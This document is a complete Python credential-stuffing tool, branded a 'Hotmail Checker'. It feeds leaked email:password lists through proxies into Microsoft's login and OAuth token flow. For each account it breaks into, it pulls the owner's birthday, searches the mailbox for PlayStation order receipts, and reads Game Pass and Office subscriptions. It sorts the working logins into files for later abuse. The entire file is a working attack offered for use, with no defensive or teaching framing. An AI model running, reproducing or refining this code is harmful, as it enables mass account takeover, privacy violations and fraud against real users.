import os
import sys
import json
import time
import re
import uuid
import requests
import threading
from datetime import datetime, timedelta
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import random
import signal
import platform
import tkinter as tk
from tkinter import filedialog

class updh_Colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    BG_BRIGHT_BLACK = '\033[100m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKE = '\033[9m'
    RESET = '\033[0m'
    CLEAR = '\033[2J\033[H'

class updh_UI:
    @staticmethod
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def print_banner():
        banner = f"""{updh_Colors.BRIGHT_MAGENTA}
██╗   ██╗██████╗ ██████╗ ██╗  ██╗
██║   ██║██╔══██╗██╔══██╗██║  ██║
██║   ██║██████╔╝██║  ██║███████║
██║   ██║██╔═══╝ ██║  ██║██╔══██║
╚██████╔╝██║     ██████╔╝██║  ██║
 ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝  {updh_Colors.RESET}
"""
        print(banner)
    
    @staticmethod
    def print_simple_menu():
        menu = f"""
{updh_Colors.BRIGHT_CYAN}
{updh_Colors.BRIGHT_WHITE}                         MAIN MENU{updh_Colors.BRIGHT_CYAN}                                      

{updh_Colors.BRIGHT_GREEN}  [1]{updh_Colors.WHITE} Start Checker{updh_Colors.BRIGHT_CYAN}                                       
{updh_Colors.BRIGHT_RED}  [2]{updh_Colors.WHITE} Exit{updh_Colors.BRIGHT_CYAN}                                             
{updh_Colors.RESET}
"""
        print(menu)

class StatsManager:
    def __init__(self, total=0):
        self.total = total
        self.checked = 0
        self.valid = 0
        self.twofa = 0
        self.invalid = 0
        self.psn_hits = 0
        self.subscriptions = {
            'game_pass_ultimate': 0,
            'game_pass_core': 0,
            'game_pass_pc': 0,
            'office_365': 0,
            'microsoft_365': 0,
            'other': 0
        }
        self.start_time = time.time()
        self.lock = Lock()
        
    def update(self, status, is_psn=False, subs_list=None):
        with self.lock:
            self.checked += 1
            if status == "VALID":
                self.valid += 1
                if is_psn:
                    self.psn_hits += 1
                if subs_list:
                    for sub in subs_list:
                        sub_lower = sub.lower()
                        if 'game_pass_ultimate' in sub_lower or 'gamepassultimate' in sub_lower:
                            self.subscriptions['game_pass_ultimate'] += 1
                        elif 'game_pass_core' in sub_lower or 'gamepasscore' in sub_lower:
                            self.subscriptions['game_pass_core'] += 1
                        elif 'game_pass_pc' in sub_lower or 'gamepasspc' in sub_lower:
                            self.subscriptions['game_pass_pc'] += 1
                        elif 'office_365' in sub_lower:
                            self.subscriptions['office_365'] += 1
                        elif 'microsoft_365' in sub_lower:
                            self.subscriptions['microsoft_365'] += 1
                        else:
                            self.subscriptions['other'] += 1
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            
            elapsed_str = str(timedelta(seconds=int(elapsed)))
            total_subs = sum(self.subscriptions.values())
            
            return {
                'total': self.total,
                'checked': self.checked,
                'valid': self.valid,
                'twofa': self.twofa,
                'invalid': self.invalid,
                'psn': self.psn_hits,
                'subscriptions': total_subs,
                'subs_detail': self.subscriptions,
                'cpm': int(cpm),
                'elapsed': elapsed_str
            }

class ResultManager:
    def __init__(self, combo_name):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = Path(f"Results/PSN_{combo_name}_{timestamp}")
        self.base_folder.mkdir(parents=True, exist_ok=True)
        
        self.valid_file = self.base_folder / "valid.txt"
        self.psn_file = self.base_folder / "psn_hits.txt"
        self.subs_file = self.base_folder / "subscriptions.txt"
        self.game_pass_file = self.base_folder / "game_pass.txt"
        self.office_file = self.base_folder / "office_365.txt"
        self.twofa_file = self.base_folder / "2fa.txt"
        self.detailed_file = self.base_folder / "detailed.txt"
        
        self.lock = Lock()
    
    def save_valid(self, email, password, result):
        with self.lock:
            subs = result.get('subscriptions', [])
            
            # Save to valid.txt
            line = f"{email}:{password}"
            if subs:
                line += " | Subscriptions: " + ", ".join(subs)
            with open(self.valid_file, 'a', encoding='utf-8') as f:
                f.write(line + "\n")
            
            # Save accounts with subscriptions
            if subs:
                with open(self.subs_file, 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password} | Subscriptions: {', '.join(subs)}\n")
                
                # Save Game Pass accounts separately
                game_pass_keywords = ['game', 'pass', 'ultimate', 'core', 'pc', 'xbox']
                if any(keyword in ' '.join(subs).lower() for keyword in game_pass_keywords):
                    with open(self.game_pass_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password} | {', '.join(subs)}\n")
                
                # Save Office 365 accounts separately
                office_keywords = ['office', 'microsoft']
                if any(keyword in ' '.join(subs).lower() for keyword in office_keywords):
                    with open(self.office_file, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password} | {', '.join(subs)}\n")
            
            # Check if PSN hit
            if result.get('psn_orders', 0) > 0:
                with open(self.psn_file, 'a', encoding='utf-8') as f:
                    birthday = result.get('birthday', 'Unknown')
                    age = result.get('age', 'Unknown')
                    orders = result.get('psn_orders', 0)
                    
                    line = f"{email}:{password} | Orders: {orders}"
                    if birthday != 'Unknown':
                        line += f" | Birthday: {birthday}"
                        if age != 'Unknown':
                            line += f" (Age: {age})"
                    if subs:
                        line += " | Subs: " + ", ".join(subs)
                    f.write(line + "\n")
            
            # Save detailed info
            with open(self.detailed_file, 'a', encoding='utf-8') as f:
                f.write(f"\n{'═'*70}\n")
                f.write(f"📧 Email: {email}\n")
                f.write(f"🔑 Password: {password}\n")
                
                birthday = result.get('birthday', 'Unknown')
                age = result.get('age', 'Unknown')
                if birthday != 'Unknown':
                    f.write(f"🎂 Birthday: {birthday}")
                    if age != 'Unknown':
                        f.write(f" (Age: {age})")
                    f.write(f"\n")

                if subs:
                    f.write(f"💼 Subscriptions:\n")
                    for sub in subs:
                        f.write(f"   • {sub}\n")
                
                f.write(f"🎮 PSN Orders: {result.get('psn_orders', 0)}\n")
                
                purchases = result.get('psn_purchases', [])
                if purchases:
                    f.write(f"\n📦 Recent Purchases:\n")
                    for i, p in enumerate(purchases[:5], 1):
                        item = p.get('item', 'Unknown')
                        price = p.get('price', 'N/A')
                        date = p.get('date', 'N/A')
                        f.write(f"  {i}. {item[:50]}\n")
                        f.write(f"     💰 {price} | 📅 {date}\n")
                
                f.write(f"{'═'*70}\n")
    
    def save_2fa(self, email, password):
        with self.lock:
            with open(self.twofa_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = Lock()
        
    def load_proxies(self, filename="proxies.txt"):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]

            parsed = []
            for line in lines:
                parts = line.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    proxy_str = f"{user}:{pwd}@{host}:{port}"
                else:
                    proxy_str = line
                parsed.append(proxy_str)

            self.proxies = parsed
            return len(self.proxies)
        except:
            return 0
    
    def get_proxy(self, proxy_type='http'):
        if not self.proxies:
            return None
        with self.lock:
            proxy = random.choice(self.proxies)
            if '://' in proxy:
                proxy = proxy.split('://', 1)[1]
            return {
                'http': f'{proxy_type}://{proxy}',
                'https': f'{proxy_type}://{proxy}'
            }

class PSNChecker:
    def __init__(self):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        
    def check(self, email, password, proxy=None):
        try:
            # Step 1: Check email type
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            if proxy:
                r1 = self.session.get(url1, headers=headers1, timeout=15, proxies=proxy)
            else:
                r1 = self.session.get(url1, headers=headers1, timeout=15)
            
            if "MSAccount" not in r1.text:
                return {"status": "INVALID", "reason": "Not Microsoft account"}
            
            time.sleep(0.3)
            
            # Step 2: Get login page
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            if proxy:
                r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15, proxies=proxy)
            else:
                r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "INVALID", "reason": "Parse error"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Post credentials
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            if proxy:
                r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15, proxies=proxy)
            else:
                r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            response_text = r3.text.lower()
            
            if "identity/confirm" in response_text or "consent" in response_text:
                return {"status": "2FA"}
            
            if "incorrect" in response_text or r3.text.count("error") > 0:
                return {"status": "INVALID", "reason": "Wrong password"}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "INVALID", "reason": "No redirect"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "INVALID", "reason": "No auth code"}
            
            code = code_match.group(1)
            
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "INVALID", "reason": "No CID"}
            
            cid = mspcid.upper()
            
            # Step 4: Exchange code for token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            if proxy:
                r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                      data=token_data, 
                                      headers={"Content-Type": "application/x-www-form-urlencoded"},
                                      timeout=15,
                                      proxies=proxy)
            else:
                r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                      data=token_data, 
                                      headers={"Content-Type": "application/x-www-form-urlencoded"},
                                      timeout=15)
            
            if "access_token" not in r4.text:
                return {"status": "INVALID", "reason": "Token error"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            birthday_result = self.get_birthday(email, access_token, cid, proxy)
            psn_result = self.check_psn(email, access_token, cid, proxy)
            subs_result = self.check_subscriptions(access_token, proxy)
            
            return {
                "status": "VALID",
                "email": email,
                "password": password,
                "birthday": birthday_result.get("birthday", "Unknown"),
                "age": birthday_result.get("age", "Unknown"),
                "psn_orders": psn_result.get("psn_orders", 0),
                "psn_purchases": psn_result.get("purchases", []),
                "subscriptions": subs_result.get("subscriptions", [])
            }
            
        except Exception as e:
            return {"status": "INVALID", "reason": str(e)[:50]}
    
    def get_birthday(self, email, access_token, cid, proxy=None):
        try:
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}'
            }
            
            url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            
            if proxy:
                r = self.session.get(url, headers=headers, timeout=15, proxies=proxy)
            else:
                r = self.session.get(url, headers=headers, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                
                birthday = None
                if 'birthday' in data:
                    birthday = data['birthday']
                elif 'birthDate' in data:
                    birthday = data['birthDate']
                elif 'dateOfBirth' in data:
                    birthday = data['dateOfBirth']
                
                if birthday:
                    try:
                        date_str = birthday.split('T')[0]
                        birth_date = datetime.strptime(date_str, '%Y-%m-%d')
                        today = datetime.now()
                        age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
                        
                        return {
                            "birthday": birth_date.strftime('%Y-%m-%d'),
                            "age": age
                        }
                    except:
                        return {
                            "birthday": str(birthday),
                            "age": "Unknown"
                        }
            
            return {"birthday": "Unknown", "age": "Unknown"}
            
        except:
            return {"birthday": "Unknown", "age": "Unknown"}
    
    def check_psn(self, email, access_token, cid, proxy=None):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
                    "Size": 20,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            if proxy:
                r = self.session.post(search_url, json=payload, headers=headers, timeout=15, proxies=proxy)
            else:
                r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        
                        if 'Results' in result_set:
                            for result in result_set['Results'][:10]:
                                purchase = {}
                                
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    
                                    patterns = [
                                        r'Thank you for purchasing\s+([^\.]+)',
                                        r'You\'ve bought\s+([^\.]+)',
                                        r'purchased\s+([^\.]+)',
                                        r'Game:\s*([^\n]+)',
                                    ]
                                    
                                    for pattern in patterns:
                                        match = re.search(pattern, preview, re.IGNORECASE)
                                        if match:
                                            purchase['item'] = match.group(1).strip()[:50]
                                            break
                                    
                                    price_match = re.search(r'[\$€£¥]\s*(\d+[\.,]\d{2})', preview)
                                    if price_match:
                                        purchase['price'] = price_match.group(0)
                                
                                if 'ReceivedTime' in result:
                                    try:
                                        date_str = result['ReceivedTime']
                                        date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                        purchase['date'] = date_obj.strftime('%Y-%m-%d')
                                    except:
                                        pass
                                
                                if purchase.get('item'):
                                    purchases.append(purchase)
                
                return {
                    "psn_orders": total_orders,
                    "purchases": purchases
                }
            
            return {"psn_orders": 0, "purchases": []}
            
        except:
            return {"psn_orders": 0, "purchases": []}

    def check_subscriptions(self, access_token, proxy=None):
        """Check for all Microsoft subscriptions including Game Pass and Office 365"""
        subscriptions = []
        
        try:
            # Method 1: Check via Graph API
            headers = {
                'Authorization': f'Bearer {access_token}',
                'Accept': 'application/json'
            }
            
            # Check subscribed SKUs
            url = "https://graph.microsoft.com/v1.0/me/subscribedSkus"
            if proxy:
                r = self.session.get(url, headers=headers, timeout=15, proxies=proxy)
            else:
                r = self.session.get(url, headers=headers, timeout=15)
                
            if r.status_code == 200:
                data = r.json()
                for item in data.get('value', []):
                    sku = item.get('skuPartNumber', '')
                    if sku:
                        # Map SKU to friendly names
                        if 'GAME_PASS' in sku or 'GAMEPASS' in sku:
                            if 'ULTIMATE' in sku:
                                subscriptions.append('Xbox Game Pass Ultimate')
                            elif 'PC' in sku:
                                subscriptions.append('Xbox Game Pass for PC')
                            elif 'CORE' in sku:
                                subscriptions.append('Xbox Game Pass Core')
                            else:
                                subscriptions.append(f'Xbox Game Pass ({sku})')
                        elif 'OFFICE' in sku or 'O365' in sku:
                            if 'BUSINESS' in sku:
                                subscriptions.append('Office 365 Business')
                            else:
                                subscriptions.append('Office 365')
                        elif 'POWER_BI' in sku:
                            subscriptions.append('Power BI')
                        elif 'VISIO' in sku:
                            subscriptions.append('Visio')
                        elif 'PROJECT' in sku:
                            subscriptions.append('Project')
                        else:
                            subscriptions.append(sku)
            
            # Method 2: Check via another endpoint for consumer subscriptions
            url2 = "https://subscriptions.microsoft.com/v1/me/entitlements"
            if proxy:
                r2 = self.session.get(url2, headers=headers, timeout=15, proxies=proxy)
            else:
                r2 = self.session.get(url2, headers=headers, timeout=15)
                
            if r2.status_code == 200:
                data2 = r2.json()
                for item in data2.get('entitlements', []):
                    name = item.get('friendlyName', '')
                    if name and name not in subscriptions:
                        subscriptions.append(name)
            
        except Exception as e:
            pass
            
        return {"subscriptions": list(set(subscriptions))}  # Remove duplicates

class CheckerEngine:
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.running = False
        self.stats = None
        self.result_manager = None
        
    def select_file(self):
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        file_path = filedialog.askopenfilename(
            title="Select combo file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        root.destroy()
        return file_path
    
    def load_combos(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
            
            valid_combos = []
            for line in lines:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    email = parts[0].strip()
                    password = parts[1].strip()
                    
                    if any(domain in email.lower() for domain in ['@hotmail', '@outlook', '@live', '@msn']):
                        valid_combos.append(f"{email}:{password}")
            
            return valid_combos
        except Exception as e:
            print(f"{updh_Colors.RED}Error loading combos: {e}{updh_Colors.RESET}")
            return []
    
    def process_combo(self, combo, stats, result_mgr):
        if not self.running:
            return
        
        try:
            email, password = combo.split(':', 1)
            
            proxy = None
            if self.use_proxies and self.proxy_manager.proxies:
                proxy = self.proxy_manager.get_proxy('http')
            
            checker = PSNChecker()
            result = checker.check(email, password, proxy)
            
            is_psn = result.get('psn_orders', 0) > 0 if result['status'] == 'VALID' else False
            subs = result.get('subscriptions', []) if result['status'] == 'VALID' else []
            
            stats.update(result['status'], is_psn, subs)
            
            if result['status'] == 'VALID':
                result_mgr.save_valid(email, password, result)
                
                # Colorful output based on subscriptions
                if 'Xbox Game Pass Ultimate' in subs:
                    prefix = f"[+]{email}"
                    line = f"{updh_Colors.BRIGHT_MAGENTA}{prefix}{updh_Colors.RESET}"
                elif any('Game Pass' in sub for sub in subs):
                    prefix = f"[+]{email}"
                    line = f"{updh_Colors.BRIGHT_CYAN}{prefix}{updh_Colors.RESET}"
                elif any('Office' in sub or '365' in sub for sub in subs):
                    prefix = f"[+]{email}"
                    line = f"{updh_Colors.BRIGHT_BLUE}{prefix}{updh_Colors.RESET}"
                else:
                    prefix = f"[+]{email}"
                    line = f"{updh_Colors.BRIGHT_GREEN}{prefix}{updh_Colors.RESET}"
                
                orders = result.get('psn_orders', 0)
                if orders > 0:
                    line += f" {updh_Colors.WHITE}| 🎮 PSN: {orders}{updh_Colors.RESET}"
                if subs:
                    line += f" {updh_Colors.WHITE}| 💼 {', '.join(subs)}{updh_Colors.RESET}"
                print(line)

            elif result['status'] == '2FA':
                result_mgr.save_2fa(email, password)
                line = f"[?]{email}"
                print(f"{updh_Colors.BRIGHT_YELLOW}{line}{updh_Colors.RESET}")
            else:
                line = f"[-]{email}"
                print(f"{updh_Colors.RED}{line}{updh_Colors.RESET}")
        except Exception as e:
            stats.update('INVALID', False)
    
    def run_checker(self):
        updh_UI.clear()
        updh_UI.print_banner()
        
        print(f"{updh_Colors.CYAN}Opening file manager...{updh_Colors.RESET}")
        time.sleep(1)
        
        combo_file = self.select_file()
        if not combo_file:
            print(f"{updh_Colors.RED}No file selected!{updh_Colors.RESET}")
            input(f"\n{updh_Colors.CYAN}Press Enter to continue...{updh_Colors.RESET}")
            return
        
        combos = self.load_combos(combo_file)
        if not combos:
            print(f"{updh_Colors.RED}No valid Microsoft accounts found in file!{updh_Colors.RESET}")
            input(f"\n{updh_Colors.CYAN}Press Enter to continue...{updh_Colors.RESET}")
            return
        
        print(f"{updh_Colors.GREEN}Loaded {len(combos)} Microsoft accounts{updh_Colors.RESET}")
        
        try:
            threads = int(input(f"{updh_Colors.CYAN}Enter number of threads (1-200):{updh_Colors.WHITE} "))
            threads = max(1, min(200, threads))
        except:
            threads = 30
            print(f"{updh_Colors.YELLOW}Invalid input, using 30 threads{updh_Colors.RESET}")
        
        proxy_choice = input(f"{updh_Colors.CYAN}Use proxies? (y/n):{updh_Colors.WHITE} ").strip().lower()
        self.use_proxies = proxy_choice == 'y'
        
        if self.use_proxies:
            proxy_count = self.proxy_manager.load_proxies("proxies.txt")
            if proxy_count > 0:
                print(f"{updh_Colors.GREEN}Loaded {proxy_count} proxies from proxies.txt{updh_Colors.RESET}")
                if threads > 50:
                    threads = 50
                    print(f"{updh_Colors.YELLOW}Reducing threads to 50 for proxy stability{updh_Colors.RESET}")
            else:
                print(f"{updh_Colors.YELLOW}No proxies found in proxies.txt, continuing without proxies{updh_Colors.RESET}")
                self.use_proxies = False
        
        combo_name = Path(combo_file).stem
        self.result_manager = ResultManager(combo_name)
        self.stats = StatsManager(len(combos))
        self.running = True
        
        updh_UI.clear()
        updh_UI.print_banner()
        print(f"{updh_Colors.CYAN}Starting check with {threads} threads...{updh_Colors.RESET}\n")
        print(f"{updh_Colors.BRIGHT_BLACK}Results will be saved to: {self.result_manager.base_folder}{updh_Colors.RESET}\n")
        
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for combo in combos:
                    if not self.running:
                        break
                    future = executor.submit(self.process_combo, combo, self.stats, self.result_manager)
                    futures.append(future)
                
                # Wait for completion without live stats
                for future in as_completed(futures):
                    if not self.running:
                        break
                    future.result()
        
        except KeyboardInterrupt:
            self.stop()
        
        finally:
            self.running = False
            self.show_final_stats()
            input(f"\n{updh_Colors.CYAN}Press Enter to continue...{updh_Colors.RESET}")
    
    def stop(self):
        self.running = False
        print(f"\n{updh_Colors.YELLOW}Stopping checker...{updh_Colors.RESET}")
    
    def show_final_stats(self):
        if self.stats:
            stats = self.stats.get_stats()
            
            print(f"\n{updh_Colors.BRIGHT_CYAN}{'═'*70}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_WHITE}                    FINAL RESULTS{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}{'═'*70}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_GREEN}  ✓ Valid Accounts: {stats['valid']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_BLUE}  🎮 PSN Hits: {stats['psn']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_MAGENTA}  💼 Total With Subscriptions: {stats['subscriptions']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}     ├─ Game Pass Ultimate: {stats['subs_detail']['game_pass_ultimate']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}     ├─ Game Pass Core: {stats['subs_detail']['game_pass_core']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}     ├─ Game Pass PC: {stats['subs_detail']['game_pass_pc']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}     ├─ Office 365: {stats['subs_detail']['office_365']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}     ├─ Microsoft 365: {stats['subs_detail']['microsoft_365']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}     └─ Other: {stats['subs_detail']['other']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_YELLOW}  🔐 2FA Required: {stats['twofa']}{updh_Colors.RESET}")
            print(f"{updh_Colors.RED}  ✖ Invalid: {stats['invalid']}{updh_Colors.RESET}")
            print(f"{updh_Colors.CYAN}  📊 Total Checked: {stats['checked']}/{stats['total']}{updh_Colors.RESET}")
            print(f"{updh_Colors.MAGENTA}  🚀 Average CPM: {stats['cpm']}{updh_Colors.RESET}")
            print(f"{updh_Colors.WHITE}  ⏱ Total Time: {stats['elapsed']}{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}{'═'*70}{updh_Colors.RESET}")
            
            if stats['valid'] > 0:
                print(f"\n{updh_Colors.GREEN}Results saved to: {self.result_manager.base_folder}{updh_Colors.RESET}")
                print(f"{updh_Colors.CYAN}  • Game Pass accounts: game_pass.txt{updh_Colors.RESET}")
                print(f"{updh_Colors.CYAN}  • Office 365 accounts: office_365.txt{updh_Colors.RESET}")
                print(f"{updh_Colors.CYAN}  • All subscriptions: subscriptions.txt{updh_Colors.RESET}")

def main():
    engine = CheckerEngine()
    
    while True:
        updh_UI.clear()
        updh_UI.print_banner()
        updh_UI.print_simple_menu()
        
        choice = input(f"\n{updh_Colors.BRIGHT_YELLOW}Hotmail Checker@main>{updh_Colors.WHITE} ").strip()
        
        if choice == '1':
            engine.run_checker()
        
        elif choice == '2':
            print(f"\n{updh_Colors.BRIGHT_GREEN}Thank you for using HotmailChecker!{updh_Colors.RESET}")
            print(f"{updh_Colors.BRIGHT_CYAN}Developed by @updh1{updh_Colors.RESET}\n")
            break
        
        else:
            print(f"{updh_Colors.RED}Invalid choice!{updh_Colors.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        def signal_handler(sig, frame):
            print(f"\n\n{updh_Colors.YELLOW}Exiting Hotmail Checker...{updh_Colors.RESET}\n")
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        
        if sys.version_info < (3, 6):
            print(f"{updh_Colors.RED}Python 3.6 or higher required!{updh_Colors.RESET}")
            sys.exit(1)
        
        try:
            import requests
        except ImportError:
            print(f"{updh_Colors.RED}Missing required package: requests{updh_Colors.RESET}")
            print(f"{updh_Colors.YELLOW}Install with: pip install requests{updh_Colors.RESET}")
            sys.exit(1)
        
        Path("Config").mkdir(exist_ok=True)
        Path("Results").mkdir(exist_ok=True)
        
        main()
        
    except KeyboardInterrupt:
        print(f"\n\n{updh_Colors.YELLOW}Exiting HotmailChecker...{updh_Colors.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{updh_Colors.RED}Fatal error: {e}{updh_Colors.RESET}")
        input(f"{updh_Colors.CYAN}Press Enter to exit...{updh_Colors.RESET}")
        sys.exit(1)